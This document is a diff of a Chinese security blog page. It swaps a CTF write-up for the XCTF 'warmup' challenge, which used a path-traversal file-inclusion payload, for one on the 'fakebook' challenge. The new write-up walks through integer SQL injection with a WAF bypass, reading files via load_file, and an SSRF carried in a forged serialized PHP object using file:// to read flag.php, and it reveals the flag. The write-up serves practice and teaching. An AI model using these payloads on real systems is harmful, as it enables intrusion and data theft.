@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>攻防世界_warmup | Wking&#39;s Blog</title>
+  <title>攻防世界_fakebook | Wking&#39;s Blog</title>
 
   <link rel="icon" type="image/png" href="/favicon.png">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -593,21 +593,21 @@
 
 
 <div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
-  background-position: center center;position: relative;background-image:url('/medias/8.jpg')">
+  background-position: center center;position: relative;background-image:url('/medias/13.jpg')">
   <div class="post-detail-header-mask"></div>
   <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
   
   <div class="post-detail-header_info-box">
     <div class="title-box">
       <span class="title">
-        攻防世界_warmup
+        攻防世界_fakebook
       </span>
     </div>
     
     
       
         <span class="post-detail-header_date">
-          <i class="fas fa-calendar"></i> 发表于：2021-09-24 |
+          <i class="fas fa-calendar"></i> 发表于：2021-09-29 |
         </span>
       
 
@@ -625,11 +625,11 @@
       
         <div class="post-detail-header_wordcount">
           <span class="totalcount">
-            <i class="fas fa-file-text-o"></i> 字数统计: 320 |
+            <i class="fas fa-file-text-o"></i> 字数统计: 852 |
           </span>
   
           <span class="min2read">
-            <i class="fas fa-clock"></i> 阅读时长: 1分钟 |
+            <i class="fas fa-clock"></i> 阅读时长: 3分钟 |
           </span>
   
           
@@ -653,74 +653,118 @@
   <div class="main-content">
     <article class="post post-detail">
       <div class="post-content">
-        <p> 1.打开网页查看源代码，发现source.php</p>
-<p><img src="https://img-blog.csdnimg.cn/20210822194648656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNzEwMzMx,size_16,color_FFFFFF,t_70" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/20210822194648656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNzEwMzMx,size_16,color_FFFFFF,t_70" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p> 2.开始代码审计，source代码如下</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">class</span> <span class="token class-name-definition class-name">emmm</span>
-    <span class="token punctuation">&#123;</span>
-        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>
-        <span class="token punctuation">&#123;</span>
-            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"source"</span><span class="token operator">=></span><span class="token string double-quoted-string">"source.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hint"</span><span class="token operator">=></span><span class="token string double-quoted-string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>
-                <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
-            <span class="token punctuation">&#125;</span>
+        <h2 id="一、fakebook"><a href="#一、fakebook" class="headerlink" title="一、fakebook"></a>一、fakebook</h2><p><img src="https://i.loli.net/2021/09/28/6JiUIWxgj4rCchD.png" class="lazyload placeholder" data-srcset="https://i.loli.net/2021/09/28/6JiUIWxgj4rCchD.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>发现是个登录注册页面，没有明确的目标，先用dirsearch扫描下目录</p>
+<p><img src="https://i.loli.net/2021/09/28/4VXyQCrAbuS1l5U.png" class="lazyload placeholder" data-srcset="https://i.loli.net/2021/09/28/4VXyQCrAbuS1l5U.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>查看flag.php,发现没任何内容，可能是不允许外网访问，考虑利用SSRF漏洞的可能性</p>
+<p>查看/robots.txt发现<code>/user.php.bak</code>备份文件，下载查看</p>
+<pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?php
+class UserInfo
+&#123;
+    public $name &#x3D; &quot;&quot;;
+    public $age &#x3D; 0;
+    public $blog &#x3D; &quot;&quot;;
 
-            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
-            <span class="token punctuation">&#125;</span>
+    public function __construct($name, $age, $blog)
+    &#123;
+        $this-&gt;name &#x3D; $name;
+        $this-&gt;age &#x3D; (int)$age;
+        $this-&gt;blog &#x3D; $blog;
+    &#125;
 
-            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
-                <span class="token variable">$page</span><span class="token punctuation">,</span>
-                <span class="token number">0</span><span class="token punctuation">,</span>
-                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>
-            <span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
-            <span class="token punctuation">&#125;</span>
+    function get($url)
+    &#123;
+        $ch &#x3D; curl_init();
 
-            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
-                <span class="token variable">$_page</span><span class="token punctuation">,</span>
-                <span class="token number">0</span><span class="token punctuation">,</span>
-                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>
-            <span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
-            <span class="token punctuation">&#125;</span>
-            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>
-            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span>
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        $output &#x3D; curl_exec($ch);
+        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        if($httpCode &#x3D;&#x3D; 404) &#123;
+            return 404;
+        &#125;
+        curl_close($ch);
 
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-        <span class="token operator">&amp;&amp;</span> <span class="token class-name static-context">emmm</span><span class="token operator">::</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-    <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-        <span class="token keyword">exit</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>  
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+        return $output;
+    &#125;
 
-<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>访问白名单出现的hint.php</p>
-<p> <img src="https://img-blog.csdnimg.cn/20210822194859656.png" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/20210822194859656.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>3.构造payload </p>
+    public function getBlogContents ()
+    &#123;
+        return $this-&gt;get($this-&gt;blog);
+    &#125;
+
+    public function isValidBlog ()
+    &#123;
+        $blog &#x3D; $this-&gt;blog;
+        return preg_match(&quot;&#x2F;^(((http(s?))\:\&#x2F;\&#x2F;)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\&#x2F;\S*)?$&#x2F;i&quot;, $blog);
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>解题的关键应该就是这个get函数传入的$url</p>
+<p>注册一个账号：</p>
+<p><img src="https://i.loli.net/2021/09/28/xrydTuZwhEpXeas.png" class="lazyload placeholder" data-srcset="https://i.loli.net/2021/09/28/xrydTuZwhEpXeas.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>点击admin，观察URL发现有个传参</p>
+<p><img src="https://i.loli.net/2021/09/28/WqKFzX29t16ZlIY.png" class="lazyload placeholder" data-srcset="https://i.loli.net/2021/09/28/WqKFzX29t16ZlIY.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>更改参数，发现两个报错</p>
+<p><img src="https://i.loli.net/2021/09/28/TMVbt7viIG3xrEf.png" class="lazyload placeholder" data-srcset="https://i.loli.net/2021/09/28/TMVbt7viIG3xrEf.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>尝试sql注入：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">view.php?no<span class="token operator">=</span><span class="token number">1</span> and <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment"># 正常 </span>
+view.php?no<span class="token operator">=</span><span class="token number">1</span> and <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment"># 报错</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>说明存在<font color='red'>整型注入</font>,接着使用union注入常用套路：</p>
 <blockquote>
-<p>既要保证checkfile返回true，又要将file传入的include语句中，我们从第三个if着手</p>
-<p>第三个 if 语句，截取传进参数中首次出现<code>?</code>之前的部分，判断该部分是否存在于<code>$whitelist</code>数组中，存在则返回 true</p>
+<p>建议一边手工注入，一边开启sqlmap在后台跑，因为可能会出现waf</p>
 </blockquote>
-<p>payload:?file=hint.php?<strong>/../../../../ffffllllaaaagggg</strong></p>
-<p><strong>4.解释后面的构造—重点</strong></p>
-<p>给出官方对include语句的说明</p>
-<p><img src="https://img-blog.csdnimg.cn/20210822195315928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNzEwMzMx,size_16,color_FFFFFF,t_70" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/20210822195315928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNzEwMzMx,size_16,color_FFFFFF,t_70" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p> 当我们使用../访问文件时，/将之前的hint.php?给忽略了，只看后面定义的路径。至于用四次../，可以逐渐增加猜测，也可根据ffffllllaaaagggg形式猜测这是四次。</p>
-<p>从而访问拿到flag</p>
-<p><img src="https://img-blog.csdnimg.cn/20210822195439368.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNzEwMzMx,size_16,color_FFFFFF,t_70" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/20210822195439368.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNzEwMzMx,size_16,color_FFFFFF,t_70" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>order by 时，4正常，5报错，所以column是4</p>
+<p><img src="https://i.loli.net/2021/09/28/8VQJMoKYf1tFmhD.png" class="lazyload placeholder" data-srcset="https://i.loli.net/2021/09/28/8VQJMoKYf1tFmhD.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>果不其然，使用union时，出现了waf：</p>
+<p><img src="https://i.loli.net/2021/09/28/cABgP3vqOi156VK.png" class="lazyload placeholder" data-srcset="https://i.loli.net/2021/09/28/cABgP3vqOi156VK.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>尝试一些基本的绕过方式：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44940180/article/details/107717511">SQL注入–绕过技巧</a></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">view.php?no<span class="token operator">=</span><span class="token number">2</span> union <span class="token punctuation">(</span>select <span class="token number">1,2</span>,3,4<span class="token punctuation">)</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>应该是直接拦截<code>union select</code>，发现2的回显位置出现了</p>
+<p><img src="https://i.loli.net/2021/09/28/iDuy5AtSHGgZdko.png" class="lazyload placeholder" data-srcset="https://i.loli.net/2021/09/28/iDuy5AtSHGgZdko.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>分别查看当前数据库和用户：</p>
+<p><img src="https://i.loli.net/2021/09/28/Khqo4XrGnPdYkTz.png" class="lazyload placeholder" data-srcset="https://i.loli.net/2021/09/28/Khqo4XrGnPdYkTz.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"><img src="https://i.loli.net/2021/09/28/VjcwlKYa8nxWIyR.png" class="lazyload placeholder" data-srcset="https://i.loli.net/2021/09/28/VjcwlKYa8nxWIyR.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20210928225336783"></p>
+<p>发现用户竟然是<font color='red'>root</font>用户，看了别人的教程，发现此处满足 <code>load_file()</code>的所有条件，所以可以直接读取flag.php</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">view.php?no<span class="token operator">=</span><span class="token number">2</span> union <span class="token punctuation">(</span>select <span class="token number">1</span>,load_file<span class="token punctuation">(</span><span class="token string">"/var/www/html/flag.php"</span><span class="token punctuation">)</span>,3,4<span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>查看相应位置的源代码：</p>
+<p><img src="https://i.loli.net/2021/09/28/Q6KxkqWh4JEm2fu.png" class="lazyload placeholder" data-srcset="https://i.loli.net/2021/09/28/Q6KxkqWh4JEm2fu.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<hr>
+<p>前面忙活了那么多，结果出来个root用户，下面尝试用正常union注入去找表和字段：</p>
+<p>找表：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">view.php?no<span class="token operator">=</span><span class="token number">2</span> union <span class="token punctuation">(</span>select <span class="token number">1</span>,group_concat<span class="token punctuation">(</span><span class="token string">'&lt;br>'</span>,table_name<span class="token punctuation">)</span>,3,4 from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>只找到了<code>users</code>表，紧接着找字段：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">view.php?no<span class="token operator">=</span><span class="token number">2</span> union <span class="token punctuation">(</span>select <span class="token number">1</span>,group_concat<span class="token punctuation">(</span><span class="token string">'&lt;br>'</span>,column_name<span class="token punctuation">)</span>,3,4 from information_schema.columns where <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://i.loli.net/2021/09/28/wOfv2k9De3xjM7A.png" class="lazyload placeholder" data-srcset="https://i.loli.net/2021/09/28/wOfv2k9De3xjM7A.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>前3个字段是知道的，现在查看<code>data</code>字段：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">view.php?no<span class="token operator">=</span><span class="token number">2</span> union <span class="token punctuation">(</span>select <span class="token number">1</span>,data,3,4 from <span class="token function">users</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://i.loli.net/2021/09/28/YofrIXEsu3tROxP.png" class="lazyload placeholder" data-srcset="https://i.loli.net/2021/09/28/YofrIXEsu3tROxP.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>是序列化后的用户，那么整个博客页面是不是有可能由这几个字段，最可能是data字段进行渲染的？！</p>
+<p>测试发现，当前面的no=3时，而<font color='red'>第四个</font>传入序列化的对象后，页面仍可以正常显示！</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">view.php?no<span class="token operator">=</span><span class="token number">3</span> union <span class="token punctuation">(</span>select <span class="token number">1,2</span>,3,<span class="token string">'O:8:"UserInfo":3:&#123;s:4:"name";s:5:"admin";s:3:"age";i:18;s:4:"blog";s:7:"123.com";&#125;'</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://i.loli.net/2021/09/28/9Gx2oKNRbmpTqwI.png" class="lazyload placeholder" data-srcset="https://i.loli.net/2021/09/28/9Gx2oKNRbmpTqwI.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>想到之前提过的SSRF，可以利用<code>file://</code>协议读取本地文件!</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">view.php?no<span class="token operator">=</span><span class="token number">2</span> union <span class="token punctuation">(</span>select <span class="token number">1,2</span>,3,<span class="token string">'O:8:"UserInfo":3:&#123;s:4:"name";s:5:"admin";s:3:"age";i:18;s:4:"blog";s:29:"file:///var/www/html/flag.php";&#125;'</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>没有出现什么东西，但查看源码发现一串很长的base64码</p>
+<p><img src="https://i.loli.net/2021/09/28/hIf3dyrvCKPpRoa.png" class="lazyload placeholder" data-srcset="https://i.loli.net/2021/09/28/hIf3dyrvCKPpRoa.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>解码得到：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"flag&#123;c1e552fdf77049fabf65168f22f7aeab&#125;"</span><span class="token punctuation">;</span>
+<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>实际上在firefox渗透版里，直接点击就可以直接查看flag.php的源码：</p>
+<p><img src="https://i.loli.net/2021/09/28/lUHPewyV4MSZ7ft.png" class="lazyload placeholder" data-srcset="https://i.loli.net/2021/09/28/lUHPewyV4MSZ7ft.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<hr>
+<p>原本以为是道代码审计，结果是个注入，嗐，菜鸡只能走一步看一步。</p>
+<p>听说在join的时候，有post的注入点，赶紧拿sqlmap试了下：</p>
 
       </div>
       <div class="post-tags-categories">
@@ -742,7 +786,7 @@
     </li>
     <li class="post-copyright-link">
     <strong>文章链接:  </strong>
-    <a href="/2021/09/24/XCTF-warmup/" target="_blank" title="攻防世界_warmup">https://Wkingxc.com/2021/09/24/XCTF-warmup/</a>
+    <a href="/2021/09/29/XCTF-fakegame/" target="_blank" title="攻防世界_fakebook">https://Wkingxc.com/2021/09/29/XCTF-fakegame/</a>
     </li>
     <li class="post-copyright-license">
       <strong>版权声明:   </strong>
@@ -760,46 +804,24 @@
 
 
 
-  
-  <div class="post-nav-prev post-nav-item">
-    <div class="post-nav-img" style="background-size: cover; 
-      background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="/medias/13.jpg" class="lazyload placeholder" data-srcset="/medias/13.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="">
-    </div>
-    <a href="/2021/09/24/MoeCTF2021_WP/" class="post-nav-link">
-      <div class="title">
-        <i class="fas fa-angle-left"></i> 上一篇:
-        <div class="title-text">MoeCTF2021_WP</div>
-      </div>
-      
-      <!-- <div class="content">
-        只有web有全部题目的题解,其余看题目有趣程度(x)
-官方题解
-我的博客：www.wkingxc.com
-一、Web前四
-      </div> -->
-    </a>
-  </div>
-
 
 
   
   <div class="post-nav-next post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="/medias/1.jpg" class="lazyload placeholder" data-srcset="/medias/1.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" src="" alt="">
+      <img class="lazyload lazyload placeholder" src="/medias/8.jpg" class="lazyload placeholder" data-srcset="/medias/8.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" src="" alt="">
     </div>
-    <a href="/2021/09/23/CTFHub-SSRF/" class="post-nav-link">
+    <a href="/2021/09/28/Web%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" class="post-nav-link">
       <div class="title">
         下一篇: <i class="fas fa-angle-right"></i>
-        <div class="title-text">CTFHub--SSRF</div>
+        <div class="title-text">Web基础漏洞</div>
       </div>
       <!-- <div class="content">
-        
-一、Post请求1.先用伪协议尝试读取index.php和flag.php文件
-以下为index.php源代码
+        一、文件包含漏洞
+一、常见函数漏洞点
 
-再看
+include()、include_once()、require()、requi
       </div> -->
     </a>
   </div>
